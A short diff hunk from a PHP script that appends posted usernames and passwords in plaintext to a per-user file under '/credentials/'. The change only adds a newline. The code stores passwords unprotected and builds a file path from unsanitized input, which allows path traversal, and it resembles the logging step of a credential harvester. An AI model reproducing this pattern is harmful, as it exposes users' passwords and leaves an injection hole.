@@ -9,7 +9,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $password = isset($_POST['pass']) ? $_POST['pass'] : '';
     
     $filePath = "/credentials/$username.txt";
-    $data = "Username: $username | Password: $password";
+    $data = "Username: $username | Password: $password\n";
     
     file_put_contents($filePath, $data, FILE_APPEND | LOCK_EX);
     
